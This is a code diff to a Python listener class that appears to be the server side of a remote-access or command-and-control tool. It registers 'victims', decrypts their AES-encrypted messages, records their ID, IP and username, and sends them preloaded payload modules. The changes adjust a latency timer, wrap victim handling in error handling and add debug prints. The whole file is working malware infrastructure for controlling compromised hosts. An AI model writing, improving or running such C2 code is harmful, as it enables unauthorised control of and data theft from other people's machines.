@@ -106,7 +106,7 @@ class Listener:
                                     clnt.dtLastLattency = datetime.now()
 
                                 def send_latency():
-                                    time.sleep(1)
+                                    time.sleep(5)
                                     clnt.send(0, 1, C2P.random_str())
 
                                 t = threading.Thread(target=send_latency)
@@ -176,48 +176,57 @@ class Listener:
                                 else:
                                     cp.pf_err('Vertification failed.', clnt.addr)
                         elif nCmd == 2: # Victim
-                            abMsg = Encoder.b64str2bytes(abMsg.decode('utf-8'))
-                            szDecMsg = clnt.pAES.decrypt_cbc(abMsg).decode('utf-8')
-                            aMsg = szDecMsg.split('|')
+                            try:
+                                cipher = Encoder.b64str2bytes(abMsg.decode('ascii'))
+                                plain = clnt.pAES.decrypt_cbc(cipher)
 
-                            if nParam == 1:
-                                self.dic_victim[clnt_addr] = EZClass.Victim(aMsg[0], None, clnt)
+                                szPlain = plain.decode('ascii')
 
-                                # pre load payload
-                                ls_preload = [
-                                    'EZEncoder',
-                                    'EZData',
-                                ]
-                                for szName in ls_preload:
-                                    szPayload = get_payload(self.dic_victim[clnt_addr].szTag, szName)
-                                    clnt.sendvictim(['*', szName, szPayload])
+                                aMsg = szPlain.split('|')
 
-                                ls_send = [
-                                    '*',
-                                    'Info',
-                                    get_payload(self.dic_victim[clnt_addr].szTag, 'Info'),
-                                    'start',
-                                ]
+                                if nParam == 1:
+                                    self.dic_victim[clnt_addr] = EZClass.Victim(aMsg[0], None, clnt)
 
-                                clnt.sendvictim(ls_send)
+                                    print(aMsg)
 
-                            if nParam == 3:
-                                aMsg = [Encoder.b64d2str(x) for x in aMsg]
-                                if aMsg[1] == 'info' and aMsg[2] == 'start':
-                                    if clnt_addr in self.dic_victim.keys():
-                                        obj_json = json.loads(aMsg[3])
+                                    # pre load payload
+                                    ls_preload = [
+                                        'EZEncoder',
+                                        'EZData',
+                                    ]
+                                    for szName in ls_preload:
+                                        szPayload = get_payload(self.dic_victim[clnt_addr].szTag, szName)
+                                        clnt.sendvictim(['*', szName, szPayload])
 
-                                        obj_class = self.dic_victim[clnt_addr]
-                                        
-                                        if obj_json['ID'] in self.dic_victim.keys():
-                                            clnt.close()
-                                            break
-                                        else:
-                                            self.dic_victim[obj_json['ID']] = EZClass.Victim(obj_class.szTag, obj_json['ID'], clnt, obj_json['IP'], obj_json['Username'])
-                                            self.dic_victim.pop(clnt_addr)
-                                            clnt.VictimID = obj_json['ID']
+                                    ls_send = [
+                                        '*',
+                                        'Info',
+                                        get_payload(self.dic_victim[clnt_addr].szTag, 'Info'),
+                                        'start',
+                                    ]
 
-                                self.msg_handler(self.main_listener, self, aMsg[0], clnt, aMsg[1:])
+                                    clnt.sendvictim(ls_send)
+
+                                elif nParam == 3:
+                                    aMsg = [Encoder.b64d2str(x) for x in aMsg]
+                                    if aMsg[1] == 'info' and aMsg[2] == 'start':
+                                        if clnt_addr in self.dic_victim.keys():
+                                            obj_json = json.loads(aMsg[3])
+
+                                            obj_class = self.dic_victim[clnt_addr]
+                                            
+                                            if obj_json['ID'] in self.dic_victim.keys():
+                                                clnt.close()
+                                                break
+                                            else:
+                                                self.dic_victim[obj_json['ID']] = EZClass.Victim(obj_class.szTag, obj_json['ID'], clnt, obj_json['IP'], obj_json['Username'])
+                                                self.dic_victim.pop(clnt_addr)
+                                                clnt.VictimID = obj_json['ID']
+
+                                    self.msg_handler(self.main_listener, self, aMsg[0], clnt, aMsg[1:])
+
+                            except Exception as ex:
+                                print(ex)
             
             cp.pf_info(f'Victim offline: {clnt.VictimID}')
 
@@ -230,7 +239,7 @@ class Listener:
         except Exception as ex:
             #raise ex
             #self.dic_victim.pop(clnt.VictimID)
-            print(ex)
+            print(f'Template: {ex}')
         
     def get_victims(self) -> dict:
         return self.dic_victim
